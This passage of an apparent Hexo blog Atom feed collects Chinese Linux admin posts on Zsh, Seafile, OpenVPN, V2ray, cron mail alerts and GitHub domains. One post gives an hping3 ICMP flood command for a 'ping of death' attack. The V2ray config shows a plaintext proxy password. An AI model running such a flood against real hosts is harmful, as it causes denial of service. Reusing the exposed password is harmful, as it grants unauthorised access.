        &lt;h1 id=&quot;SSH端口转发情景模拟&quot;&gt;&lt;a href=&quot;#SSH端口转发情景模拟&quot; class=&quot;headerlink&quot; title=&quot;SSH端口转发情景模拟&quot;&gt;&lt;/a&gt;SSH端口转发情景模拟&lt;/h1&gt;&lt;p&gt;SSH会自动加密和解密所有SSH客户端与服务端之间的网络数据。这一过
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Oh my zsh 配置</title>
    <link href="http://dongbing.me/2019/04/12/Linux/Oh%20my%20zsh%20%E9%85%8D%E7%BD%AE/"/>
    <id>http://dongbing.me/2019/04/12/Linux/Oh my zsh 配置/</id>
    <published>2019-04-11T16:00:00.000Z</published>
    <updated>2019-04-12T15:39:45.174Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Oh-my-zsh-配置"><a href="#Oh-my-zsh-配置" class="headerlink" title="Oh my zsh 配置"></a>Oh my zsh 配置</h1><h2 id="安装-powerline"><a href="#安装-powerline" class="headerlink" title="安装 powerline"></a>安装 powerline</h2><p>在终端里面输入：<br><code>pip install powerline-status</code><br>安装完成。</p><h2 id="安装-powerline-fonts"><a href="#安装-powerline-fonts" class="headerlink" title="安装 powerline fonts"></a>安装 powerline fonts</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># clone</span><br><span class="line">git clone https://github.com/powerline/fonts.git</span><br><span class="line"># install</span><br><span class="line">cd fonts</span><br><span class="line">./install.sh</span><br><span class="line"># clean-up a bit</span><br><span class="line">cd ..</span><br><span class="line">rm -rf fonts</span><br></pre></td></tr></table></figure><h2 id="安装-agnoster-主题"><a href="#安装-agnoster-主题" class="headerlink" title="安装 agnoster 主题"></a>安装 agnoster 主题</h2><ol><li>在终端中输入：<br><code>git clone https://github.com/fcamblor/oh-my-zsh-agnoster-fcamblor.git</code></li><li>然后到目录里面运行install文件，就可以主题安装到~/.oh-my-zsh/themes目录下 。</li><li>切换到用户根目录，打开.zshrc文件，然后将ZSH_THEME后面的字段改为agnoster即可。像这样ZSH_THEME=”agnoster”。</li></ol><h2 id="安装-antigen"><a href="#安装-antigen" class="headerlink" title="安装 antigen"></a>安装 antigen</h2><ol><li>在终端中输入：<br><code>git clone https://github.com/zsh-users/antigen.git</code></li><li>修改家目录下面的.zshrc文件<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">source /path-to-antigen-clone/antigen.zsh</span><br><span class="line"># Load the oh-my-zsh&apos;s library.</span><br><span class="line">antigen use oh-my-zsh</span><br><span class="line"># Bundles from the default repo (robbyrussell&apos;s oh-my-zsh).</span><br><span class="line">antigen bundle git</span><br><span class="line">antigen bundle heroku</span><br><span class="line">antigen bundle pip</span><br><span class="line">antigen bundle lein</span><br><span class="line">antigen bundle command-not-found</span><br><span class="line"># Syntax highlighting bundle.</span><br><span class="line">antigen bundle zsh-users/zsh-syntax-highlighting</span><br><span class="line"># Load the theme.</span><br><span class="line">antigen theme robbyrussell</span><br><span class="line"># Tell Antigen that you&apos;re done.</span><br><span class="line">antigen apply</span><br></pre></td></tr></table></figure></li></ol>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;Oh-my-zsh-配置&quot;&gt;&lt;a href=&quot;#Oh-my-zsh-配置&quot; class=&quot;headerlink&quot; title=&quot;Oh my zsh 配置&quot;&gt;&lt;/a&gt;Oh my zsh 配置&lt;/h1&gt;&lt;h2 id=&quot;安装-powerline&quot;&gt;&lt;a href=&quot;#安
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Seafile备份恢复后排坑</title>
    <link href="http://dongbing.me/2019/04/12/Linux/Seafile%E5%A4%87%E4%BB%BD%E6%81%A2%E5%A4%8D%E5%90%8E%E6%8E%92%E5%9D%91/"/>
    <id>http://dongbing.me/2019/04/12/Linux/Seafile备份恢复后排坑/</id>
    <published>2019-04-11T16:00:00.000Z</published>
    <updated>2019-04-12T15:39:45.186Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Seafile备份恢复后排坑"><a href="#Seafile备份恢复后排坑" class="headerlink" title="Seafile备份恢复后排坑"></a>Seafile备份恢复后排坑</h1><h2 id="1-数据库恢复后记得flush-privileges"><a href="#1-数据库恢复后记得flush-privileges" class="headerlink" title="1 数据库恢复后记得flush privileges;"></a>1 数据库恢复后记得flush privileges;</h2><h2 id="2-配置seafile-data的位置在ccnet-seafile-ini文件中"><a href="#2-配置seafile-data的位置在ccnet-seafile-ini文件中" class="headerlink" title="2 配置seafile-data的位置在ccnet/seafile.ini文件中"></a>2 配置seafile-data的位置在ccnet/seafile.ini文件中</h2><h2 id="3-seahub-sh-start-fastcg-可以看到报错的原因，安装相应的库即可"><a href="#3-seahub-sh-start-fastcg-可以看到报错的原因，安装相应的库即可" class="headerlink" title="3 ./seahub.sh start-fastcg 可以看到报错的原因，安装相应的库即可"></a>3 ./seahub.sh start-fastcg 可以看到报错的原因，安装相应的库即可</h2>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;Seafile备份恢复后排坑&quot;&gt;&lt;a href=&quot;#Seafile备份恢复后排坑&quot; class=&quot;headerlink&quot; title=&quot;Seafile备份恢复后排坑&quot;&gt;&lt;/a&gt;Seafile备份恢复后排坑&lt;/h1&gt;&lt;h2 id=&quot;1-数据库恢复后记得flush-p
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Ping of death攻击</title>
    <link href="http://dongbing.me/2019/04/12/Linux/Ping%20of%20death%E6%94%BB%E5%87%BB/"/>
    <id>http://dongbing.me/2019/04/12/Linux/Ping of death攻击/</id>
    <published>2019-04-11T16:00:00.000Z</published>
    <updated>2019-04-12T15:39:45.238Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Ping-of-death攻击"><a href="#Ping-of-death攻击" class="headerlink" title="Ping of death攻击"></a>Ping of death攻击</h1><h2 id="1-安装hping"><a href="#1-安装hping" class="headerlink" title="1. 安装hping"></a>1. 安装hping</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install hping3</span><br></pre></td></tr></table></figure><h2 id="2-Flood-ping-攻击"><a href="#2-Flood-ping-攻击" class="headerlink" title="2. Flood ping 攻击"></a>2. Flood ping 攻击</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo hping3 192.168.13.1 -1 -d 66000 -c 1 --flood</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;Ping-of-death攻击&quot;&gt;&lt;a href=&quot;#Ping-of-death攻击&quot; class=&quot;headerlink&quot; title=&quot;Ping of death攻击&quot;&gt;&lt;/a&gt;Ping of death攻击&lt;/h1&gt;&lt;h2 id=&quot;1-安装hping&quot;&gt;&lt;a
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>安装配置OpenVPN服务器</title>
    <link href="http://dongbing.me/2019/04/12/Linux/%E5%AE%89%E8%A3%85%E9%85%8D%E7%BD%AEOpenVPN%E6%9C%8D%E5%8A%A1%E5%99%A8/"/>
    <id>http://dongbing.me/2019/04/12/Linux/安装配置OpenVPN服务器/</id>
    <published>2019-04-11T16:00:00.000Z</published>
    <updated>2019-04-12T15:39:45.262Z</updated>
    
    <content type="html"><![CDATA[<h1 id="安装配置OpenVPN服务器"><a href="#安装配置OpenVPN服务器" class="headerlink" title="安装配置OpenVPN服务器"></a>安装配置OpenVPN服务器</h1><h2 id="1-安装openvpn和easy-rsa"><a href="#1-安装openvpn和easy-rsa" class="headerlink" title="1. 安装openvpn和easy-rsa"></a>1. 安装openvpn和easy-rsa</h2><h2 id="2-配置openvpn和easy-rsa"><a href="#2-配置openvpn和easy-rsa" class="headerlink" title="2. 配置openvpn和easy-rsa"></a>2. 配置openvpn和easy-rsa</h2><p>首先修改<code>/usr/share/easy-rsa/2.0/vars</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">export KEY_COUNTRY=&quot;CN&quot;</span><br><span class="line">export KEY_PROVINCE=&quot;SH&quot;</span><br><span class="line">export KEY_CITY=&quot;Shanghai&quot;</span><br><span class="line">export KEY_ORG=&quot;SJTU&quot;</span><br><span class="line">export KEY_EMAIL=&quot;dongbing@sjtu.edu.cn&quot;</span><br><span class="line">export KEY_OU=&quot;SJTU&quot;</span><br></pre></td></tr></table></figure><p>初始化环境变量：<code>source vars</code><br>之后按照如下步骤进行：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"># 清除keys目录下所有与证书相关的文件</span><br><span class="line"># 下面步骤生成的证书和密钥都在/usr/share/easy-rsa/2.0/keys目录里</span><br><span class="line">./clean-all</span><br><span class="line"> </span><br><span class="line"># 生成根证书ca.crt和根密钥ca.key（一路按回车即可）</span><br><span class="line">./build-ca</span><br><span class="line"> </span><br><span class="line"># 为服务端生成证书和密钥（一路按回车，直到提示需要输入y/n时，输入y再按回车，一共两次）</span><br><span class="line">./build-key-server server</span><br><span class="line"> </span><br><span class="line"># 每一个登陆的VPN客户端需要有一个证书，每个证书在同一时刻只能供一个客户端连接，下面建立2份</span><br><span class="line"># 为客户端生成证书和密钥（一路按回车，直到提示需要输入y/n时，输入y再按回车，一共两次）</span><br><span class="line">./build-key client1</span><br><span class="line">./build-key client2</span><br><span class="line"> </span><br><span class="line"># 创建迪菲·赫尔曼密钥，会生成dh2048.pem文件（生成过程比较慢，在此期间不要去中断它）</span><br><span class="line">./build-dh</span><br><span class="line"> </span><br><span class="line"># 生成ta.key文件（防DDos攻击、UDP淹没等恶意攻击）</span><br><span class="line">openvpn --genkey --secret keys/ta.key</span><br><span class="line"># 在openvpn的配置目录下新建一个keys目录</span><br><span class="line">mkdir /etc/openvpn/keys</span><br><span class="line"> </span><br><span class="line"># 将需要用到的openvpn证书和密钥复制一份到刚创建好的keys目录中</span><br><span class="line">cp /usr/share/easy-rsa/2.0/keys/&#123;ca.crt,server.&#123;crt,key&#125;,dh2048.pem,ta.key&#125; /etc/openvpn/keys/</span><br><span class="line"> </span><br><span class="line"># 复制一份服务器端配置文件模板server.conf到/etc/openvpn/</span><br><span class="line">cp /usr/share/doc/openvpn/sample/sample-config-files/server.conf /etc/openvpn/</span><br><span class="line"># 编辑server.conf</span><br><span class="line">vim /etc/openvpn/server.conf</span><br></pre></td></tr></table></figure><p>OpenVPN的服务器端配置如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">port 1194</span><br><span class="line"># 改成tcp，默认使用udp，如果使用HTTP Proxy，必须使用tcp协议</span><br><span class="line">proto tcp</span><br><span class="line">dev tun</span><br><span class="line"># 路径前面加keys，全路径为/etc/openvpn/keys/ca.crt</span><br><span class="line">ca keys/ca.crt</span><br><span class="line">cert keys/server.crt</span><br><span class="line">key keys/server.key  # This file should be kept secret</span><br><span class="line">dh keys/dh2048.pem</span><br><span class="line"># 默认虚拟局域网网段，不要和实际的局域网冲突即可</span><br><span class="line">server 10.8.0.0 255.255.255.0</span><br><span class="line">ifconfig-pool-persist ipp.txt</span><br><span class="line"># 10.0.0.0/8是我这台VPN服务器所在的内网的网段，读者应该根据自身实际情况进行修改</span><br><span class="line">push &quot;route 10.0.0.0 255.0.0.0&quot;</span><br><span class="line"># 转发所有流量</span><br><span class="line">push &quot;redirect-gateway def1 bypass-dhcp&quot;</span><br><span class="line"># 可以让客户端之间相互访问直接通过openvpn程序转发，根据需要设置</span><br><span class="line">client-to-client</span><br><span class="line"># 如果客户端都使用相同的证书和密钥连接VPN，一定要打开这个选项，否则每个证书只允许一个人连接VPN</span><br><span class="line">duplicate-cn</span><br><span class="line">keepalive 10 120</span><br><span class="line">tls-auth keys/ta.key 0 # This file is secret</span><br><span class="line">comp-lzo</span><br><span class="line">persist-key</span><br><span class="line">persist-tun</span><br><span class="line"># OpenVPN的状态日志，默认为/etc/openvpn/openvpn-status.log</span><br><span class="line">status openvpn-status.log</span><br><span class="line"># OpenVPN的运行日志，默认为/etc/openvpn/openvpn.log </span><br><span class="line">log-append openvpn.log</span><br><span class="line"># 改成verb 5可以多查看一些调试信息</span><br><span class="line">verb 5</span><br></pre></td></tr></table></figure><p>修改<code>/etc/sysctl.conf</code>，开启路由转发：<code>net.ipv4.ip_forword=1</code>，执行<code>sysctl -p</code>生效。</p><h2 id="3-创建客户端配置文件"><a href="#3-创建客户端配置文件" class="headerlink" title="3. 创建客户端配置文件"></a>3. 创建客户端配置文件</h2><p>复制一份client.conf模板命名为client.ovpn</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cp /usr/share/doc/openvpn/sample/sample-config-files/client.conf client.ovpn</span><br></pre></td></tr></table></figure><p>编辑client.ovpn</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">client</span><br><span class="line">dev tun</span><br><span class="line"># 改为tcp</span><br><span class="line">proto tcp</span><br><span class="line"># OpenVPN服务器的外网IP和端口</span><br><span class="line">remote 203.195.xxx.xxx 1194</span><br><span class="line">resolv-retry infinite</span><br><span class="line">nobind</span><br><span class="line">persist-key</span><br><span class="line">persist-tun</span><br><span class="line">ca ca.crt</span><br><span class="line"># client1的证书</span><br><span class="line">cert client1.crt</span><br><span class="line"># client1的密钥</span><br><span class="line">key client1.key</span><br><span class="line">ns-cert-type server</span><br><span class="line"># 去掉前面的注释</span><br><span class="line">tls-auth ta.key 1</span><br><span class="line">comp-lzo</span><br><span class="line">verb 3</span><br></pre></td></tr></table></figure><p>最后将OpenVPN服务器上的client.ovpn、ca.crt、client.crt、client.key、ta.key上传到客户端安装目录下的config文件夹</p><h2 id="4-修改iptables"><a href="#4-修改iptables" class="headerlink" title="4. 修改iptables"></a>4. 修改iptables</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iptables-restore &lt; iptables_backup</span><br></pre></td></tr></table></figure><p>iptables_back文件内容如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">*nat</span><br><span class="line">:PREROUTING ACCEPT [5:341]</span><br><span class="line">:POSTROUTING ACCEPT [2:1144]</span><br><span class="line">:OUTPUT ACCEPT [2:1144]</span><br><span class="line">-A POSTROUTING -s 10.8.0.0/24 -o enp2s0 -j MASQUERADE </span><br><span class="line">COMMIT</span><br><span class="line">*filter</span><br><span class="line">:INPUT ACCEPT [134:8536]</span><br><span class="line">:FORWARD ACCEPT [0:0]</span><br><span class="line">:OUTPUT ACCEPT [176:128044]</span><br><span class="line">-A INPUT -p tcp -m tcp --dport 1194 -m comment --comment &quot;openvpn&quot; -j ACCEPT </span><br><span class="line">COMMIT</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;安装配置OpenVPN服务器&quot;&gt;&lt;a href=&quot;#安装配置OpenVPN服务器&quot; class=&quot;headerlink&quot; title=&quot;安装配置OpenVPN服务器&quot;&gt;&lt;/a&gt;安装配置OpenVPN服务器&lt;/h1&gt;&lt;h2 id=&quot;1-安装openvpn和easy-
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Solve “Word too long” error</title>
    <link href="http://dongbing.me/2019/04/12/Linux/Solve%20%E2%80%9CWord%20too%20long%E2%80%9D%20error/"/>
    <id>http://dongbing.me/2019/04/12/Linux/Solve “Word too long” error/</id>
    <published>2019-04-11T16:00:00.000Z</published>
    <updated>2019-04-12T15:39:45.242Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Solve-“Word-too-long”-error"><a href="#Solve-“Word-too-long”-error" class="headerlink" title="Solve “Word too long” error"></a>Solve “Word too long” error</h1><h2 id="Step-1"><a href="#Step-1" class="headerlink" title="Step 1:"></a>Step 1:</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install tcsh</span><br></pre></td></tr></table></figure><h2 id="Step-2"><a href="#Step-2" class="headerlink" title="Step 2:"></a>Step 2:</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo update-alternatives --config csh</span><br></pre></td></tr></table></figure><p>Select tcsh from the list of choices available.</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;Solve-“Word-too-long”-error&quot;&gt;&lt;a href=&quot;#Solve-“Word-too-long”-error&quot; class=&quot;headerlink&quot; title=&quot;Solve “Word too long” error&quot;&gt;&lt;/a&gt;Solve
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>V2ray 服务器配置文件</title>
    <link href="http://dongbing.me/2019/04/12/Linux/V2ray%20%E6%9C%8D%E5%8A%A1%E5%99%A8%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6/"/>
    <id>http://dongbing.me/2019/04/12/Linux/V2ray 服务器配置文件/</id>
    <published>2019-04-11T16:00:00.000Z</published>
    <updated>2019-04-12T15:39:45.230Z</updated>
    
    <content type="html"><![CDATA[<h1 id="V2ray-服务器配置文件"><a href="#V2ray-服务器配置文件" class="headerlink" title="V2ray 服务器配置文件"></a>V2ray 服务器配置文件</h1><h2 id="服务器配置文件路径"><a href="#服务器配置文件路径" class="headerlink" title="服务器配置文件路径"></a>服务器配置文件路径</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/etc/v2ray/config.json</span><br></pre></td></tr></table></figure><h2 id="配置文件内容"><a href="#配置文件内容" class="headerlink" title="配置文件内容"></a>配置文件内容</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;log&quot; : &#123;</span><br><span class="line">    &quot;access&quot;: &quot;/var/log/v2ray/access.log&quot;,</span><br><span class="line">    &quot;error&quot;: &quot;/var/log/v2ray/error.log&quot;,</span><br><span class="line">    &quot;loglevel&quot;: &quot;warning&quot;</span><br><span class="line">  &#125;,</span><br><span class="line">  &quot;inbound&quot;: &#123;</span><br><span class="line">    &quot;port&quot;: 10010,</span><br><span class="line">    &quot;protocol&quot;: &quot;vmess&quot;,</span><br><span class="line">    &quot;settings&quot;: &#123;</span><br><span class="line">      &quot;clients&quot;: [</span><br><span class="line">        &#123;</span><br><span class="line">          &quot;id&quot;: &quot;8e540d28-3887-49a7-8fda-d7c7554dc8bc&quot;,</span><br><span class="line">          &quot;level&quot;: 1,</span><br><span class="line">          &quot;alterId&quot;: 64</span><br><span class="line">        &#125;</span><br><span class="line">      ]</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  &quot;inboundDetour&quot;:[</span><br><span class="line">  &#123;</span><br><span class="line">    &quot;port&quot;: 1111,</span><br><span class="line">    &quot;protocol&quot;: &quot;shadowsocks&quot;,</span><br><span class="line">    &quot;settings&quot;:&#123;</span><br><span class="line">      &quot;method&quot;: &quot;aes-256-cfb&quot;,</span><br><span class="line">      &quot;password&quot;: &quot;*#950LnPvS#*&quot;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  ],</span><br><span class="line">  &quot;outbound&quot;: &#123;</span><br><span class="line">    &quot;protocol&quot;: &quot;freedom&quot;,</span><br><span class="line">    &quot;settings&quot;: &#123;&#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  &quot;outboundDetour&quot;: [</span><br><span class="line">    &#123;</span><br><span class="line">      &quot;protocol&quot;: &quot;blackhole&quot;,</span><br><span class="line">      &quot;settings&quot;: &#123;&#125;,</span><br><span class="line">      &quot;tag&quot;: &quot;blocked&quot;</span><br><span class="line">    &#125;</span><br><span class="line">  ],</span><br><span class="line">  &quot;routing&quot;: &#123;</span><br><span class="line">    &quot;strategy&quot;: &quot;rules&quot;,</span><br><span class="line">    &quot;settings&quot;: &#123;</span><br><span class="line">      &quot;rules&quot;: [</span><br><span class="line">        &#123;</span><br><span class="line">          &quot;type&quot;: &quot;field&quot;,</span><br><span class="line">          &quot;ip&quot;: [&quot;geoip:private&quot;],</span><br><span class="line">          &quot;outboundTag&quot;: &quot;blocked&quot;</span><br><span class="line">        &#125;</span><br><span class="line">      ]</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;V2ray-服务器配置文件&quot;&gt;&lt;a href=&quot;#V2ray-服务器配置文件&quot; class=&quot;headerlink&quot; title=&quot;V2ray 服务器配置文件&quot;&gt;&lt;/a&gt;V2ray 服务器配置文件&lt;/h1&gt;&lt;h2 id=&quot;服务器配置文件路径&quot;&gt;&lt;a href=&quot;#
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>监视服务器中指定名称的进程并用邮件发送</title>
    <link href="http://dongbing.me/2019/04/12/Linux/%E7%9B%91%E8%A7%86%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%B8%AD%E6%8C%87%E5%AE%9A%E5%90%8D%E7%A7%B0%E7%9A%84%E8%BF%9B%E7%A8%8B%E5%B9%B6%E7%94%A8%E9%82%AE%E4%BB%B6%E5%8F%91%E9%80%81/"/>
    <id>http://dongbing.me/2019/04/12/Linux/监视服务器中指定名称的进程并用邮件发送/</id>
    <published>2019-04-11T16:00:00.000Z</published>
    <updated>2019-04-12T15:39:45.226Z</updated>
    
    <content type="html"><![CDATA[<h1 id="监视服务器中指定名称的进程并用邮件发送"><a href="#监视服务器中指定名称的进程并用邮件发送" class="headerlink" title="监视服务器中指定名称的进程并用邮件发送"></a>监视服务器中指定名称的进程并用邮件发送</h1><h2 id="1-配置发送邮件"><a href="#1-配置发送邮件" class="headerlink" title="1. 配置发送邮件"></a>1. 配置发送邮件</h2><p>修改<code>/etc/mail.rc</code>文件，增加内容如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">set from=xxx@qq.com</span><br><span class="line">set smtp=smtp.qq.com</span><br><span class="line">set smtp-auth-user=xxx</span><br><span class="line">set smtp-auth-password=xxx</span><br><span class="line">set smtp-auth=login</span><br></pre></td></tr></table></figure><h2 id="2-编写shell脚本"><a href="#2-编写shell脚本" class="headerlink" title="2. 编写shell脚本"></a>2. 编写shell脚本</h2><p>如果发现有ansys进程开启，则发送主题为“Sugon”的邮件到<a href="mailto:cbd.cpq@outlook.com" target="_blank" rel="noopener">cbd.cpq@outlook.com</a>邮箱。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#! /bin/bash</span><br><span class="line"></span><br><span class="line">ansys_proc=`ps -ef | grep ansys | grep -v grep`</span><br><span class="line">if [[ $ansys_proc != &quot;&quot; ]]</span><br><span class="line">then</span><br><span class="line">    echo -e $ansys_proc | mail -s &quot;Sugon&quot; cbd.cpq@outlook.com</span><br><span class="line">fi</span><br></pre></td></tr></table></figure><h2 id="3-添加定时任务"><a href="#3-添加定时任务" class="headerlink" title="3. 添加定时任务"></a>3. 添加定时任务</h2><p>每五分钟，检查一次。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">crontab -e</span><br><span class="line">*/5 * * * * /public/home/dongbing/monitoring_an.sh</span><br></pre></td></tr></table></figure><p>使用<code>crontab -l</code>查看当前用户的定时任务。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;监视服务器中指定名称的进程并用邮件发送&quot;&gt;&lt;a href=&quot;#监视服务器中指定名称的进程并用邮件发送&quot; class=&quot;headerlink&quot; title=&quot;监视服务器中指定名称的进程并用邮件发送&quot;&gt;&lt;/a&gt;监视服务器中指定名称的进程并用邮件发送&lt;/h1&gt;&lt;h2 i
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>github绑定自己的域名</title>
    <link href="http://dongbing.me/2019/04/12/Linux/github%E7%BB%91%E5%AE%9A%E8%87%AA%E5%B7%B1%E7%9A%84%E5%9F%9F%E5%90%8D/"/>
    <id>http://dongbing.me/2019/04/12/Linux/github绑定自己的域名/</id>
    <published>2019-04-11T16:00:00.000Z</published>
    <updated>2019-04-12T15:39:45.150Z</updated>
    
    <content type="html"><![CDATA[<h1 id="github绑定自己的域名"><a href="#github绑定自己的域名" class="headerlink" title="github绑定自己的域名"></a>github绑定自己的域名</h1><h2 id="1-向你的-Github-Pages-仓库添加一个CNAME"><a href="#1-向你的-Github-Pages-仓库添加一个CNAME" class="headerlink" title="1. 向你的 Github Pages 仓库添加一个CNAME"></a>1. 向你的 Github Pages 仓库添加一个CNAME</h2><p>一定要<strong>大写</strong>文件其中只能包含一个顶级域名，像这样：example.com。<br>如果你是用hexo框架搭建博客并部署到Github Pages上，每次<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; hexo g</span><br><span class="line">&gt; hexo d</span><br></pre></td></tr></table></figure></p><p>后会把你的博客所在目录下public文件夹里的东西都推到Github Pages仓库上，并且把CNAME文件覆盖掉，解决这个问题可以直接把CNAME文件添加到source文件夹里，这样每次推的时候就不用担心仓库里的CNAME文件被覆盖掉了。</p><h2 id="2-向你的-DNS-配置中添加3条记录"><a href="#2-向你的-DNS-配置中添加3条记录" class="headerlink" title="2. 向你的 DNS 配置中添加3条记录"></a>2. 向你的 DNS 配置中添加3条记录</h2><figure class="highlight plain"><table><tr><td 